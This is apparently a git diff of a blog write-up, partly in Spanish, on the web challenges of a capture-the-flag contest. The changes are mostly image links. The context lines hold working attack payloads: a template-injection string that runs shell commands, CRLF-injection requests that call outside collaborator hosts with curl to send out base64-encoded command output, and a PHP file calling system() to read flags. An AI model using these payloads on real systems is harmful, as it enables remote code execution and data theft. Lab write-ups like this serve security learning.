@@ -2,13 +2,13 @@
 title: Cyber Apocalypse 2025 - 6x Web Challenges Writeup
 date: 2025-03-25 08:00:00 -0500
 image: 
- path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg
+ path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image.png
  height: 1400
  width: 700
 categories: [HTB Writeups, Cyber Apocalypse CTF]
 tags: [Writeup, CTF, Web]
 ---
-
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-26.png)
 I participated as a member of team **CibersecUNI**. This time i managed to solve all 6/6 challenges in the web category.
 
 Web
@@ -16,9 +16,6 @@ Web
 - [Trial by Fire](#Trial-by-Fire)
 - [Cyber Attack](#Cyber-Attack)
 - [Eldoria Panel](#Eldoria-Panel)
-
-Secure Coding
-- [Locktalk](#locktalk)
 
 # Whispers of the Moonbeam
 
@@ -28,7 +25,7 @@ Secure Coding
 
 ovserving the functions, at the bottom it indicates use ; to `inject commands`.
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-1.png)
 
 Using the command gossip, I can list the files, and with a simple ; I can read the flag
 
@@ -47,7 +44,7 @@ this was very straightforward challenge.
 
 Looking at the ui, this might be exploitable to ssti
 
-![alt text](image-2.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-2.png)
 
 ```python
 @web.route('/begin', methods=['POST'])
@@ -79,10 +76,10 @@ def battle_report():
         'outcome': request.form.get('outcome', 'defeat')
     }
 ```
-![](image-9.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-9.png)
 
 The template is the following, so we should hit the endpoint /battle-report in order to get our ssti payload work.
-![](image-10.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-10.png)
 
 ```html
 <div class="warrior-info">
@@ -90,22 +87,22 @@ The template is the following, so we should hit the endpoint /battle-report in o
     <p class="nes-text is-primary warrior-name">{warrior_name}</p>
 </div>
 ```
-![a](image-3.png)
-![alt text](image-11.png)
+![a](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-3.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-11.png)
 
 After verifying that our string {{7*7}} is renderized as 49 in the response, we should inject our final payload to read the flag.
 
-![alt text](image-5.png)
-![](image-12.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-5.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-12.png)
 
 
 ```python
 warrior_name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20flag.txt').read()}}
 ```
 
-![alt text](image-6.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-6.png)
 
-![](image-13.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-13.png)
 Get the flag. 🎉
 HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}
 
@@ -119,7 +116,7 @@ el utlimo reto hacerlo cuando salgan los writeups
 
 Este reto tiene varios pasos, pero en general se abusará de CRLF Injection + Proxy + RCE
 
-![](image-14.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-14.png)
 
 Se observa un panel con 2 campos, name y domain, solo se puede usar el boton de Attack a Domain, ya que el boton de Attack an IP solo se puede realizar desde localhost. Gracias a esta porción de código en el index.php
 ```js
@@ -219,11 +216,11 @@ Nuestro payload completo se traduce a:
 GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30aqsmhrfmvylkqdnuqyqqpqvhktneu42h2.oast.fun?testt)%260name=%0D%0A%0D%0A
 ```
 
-![alt text](image-15.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-15.png)
 
 El cual hace una simple petición a mi webhook para validar si funciona.
 
-![alt text](image-16.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-16.png)
 
 Se observa que si funciona, otro incoveniente ahora es que no se puede usar / en el comando, entonces para listar y navegar por directorios tuve que usar un poco de ingenio.
 
@@ -238,7 +235,7 @@ Tuve que realizar el siguiente, dado que este comando no tiene el caracter '/' y
 echo 'cd ..;cd ..;cd ..; ls'|sh| base64 -w0
 ```
 
-![listfiles](image-8.png)
+![listfiles](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-8.png)
 
 ```bash 
 echo 'cd ..;cd ..;cd ..; cat flag-jqpeei2a5jk8hr8.txt'|sh| base64 -w0
@@ -250,7 +247,7 @@ Como payload final para leer la flag usé Burp Collaborator para decodear a la v
 GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30cfvekttb0yhbc2ia84d9zkasqjwak68v.oastify.com?p=$(echo%25%32%30%27cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62%25%32%30cat%25%32%30*.txt%27|sh|%25%32%30base64%25%32%30-w0))%260name=%0D%0A%0D%0A 
 ```
 
-![Collabflag](image-7.png)
+![Collabflag](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-7.png)
 
 Get the flag. 🎉
 HTB{h4ndl1n6_m4l4k4r5_f0rc35}
@@ -275,7 +272,7 @@ func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmi
 
 # Eldoria Panel
 
-![](image-20.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-20.png)
 
 Nos encontramos con este panel, existe una funcionalidad de "claim guest"
 
@@ -284,11 +281,11 @@ Nos encontramos con este panel, existe una funcionalidad de "claim guest"
 https://sftpcloud.io/tools/free-ftp-server
 
 FTP upload
-![alt text](image-21.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-21.png)
 
 
 
-![](image-17.png)
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png)
 
 ```php
 <?php
@@ -302,9 +299,9 @@ system("cat /flag*");
   "template_path": "ftp://da192e7de042469196ddc45e20c9eb88:i2rMACU1fteQbrIEqh3zAqdNezrtTpKH@eu-central-1.sftpcloud.io"
 }
 ```
-![alt text](image-18.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-18.png)
 
-![alt text](image-19.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-19.png)
 Get the flag. 🎉
 
 HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}
@@ -312,12 +309,12 @@ HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}
 
 # Eldoria Realms
 
-![alt text](image-22.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-22.png)
 
-![alt text](image-24.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-24.png)
 
-![alt text](image-25.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-25.png)
 
-![alt text](image-23.png)
+![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-23.png)
 
 HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_d730bc90109dcd38663a32b93f3ac999}
